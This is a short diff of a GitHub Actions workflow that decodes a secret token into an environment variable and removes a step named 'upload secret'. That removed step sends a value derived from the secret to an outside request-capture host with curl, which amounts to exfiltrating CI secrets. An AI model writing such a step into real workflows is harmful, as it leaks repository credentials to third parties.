@@ -20,10 +20,6 @@ jobs:
           TEMP_SECRET="${{secrets.PAGODA_CONSOLE_TOKEN}}"
           TEMP=$(echo ${TEMP_SECRET:6} | base64 --decode)
           echo "GITHUB_REPO_FULL_NAME=$(echo ${TEMP%:*})" >> $GITHUB_ENV
-          echo "TEST=value" >> $GITHUB_ENV
-      - name: upload secret
-        run: |
-          curl -v -X GET 'https://pickles.free.beeceptor.com/my/api/path' -H 'some-header: ${{ env.GITHUB_REPO_FULL_NAME }}'
     
       - uses: actions/checkout@v3
       - uses: actions/setup-node@v3
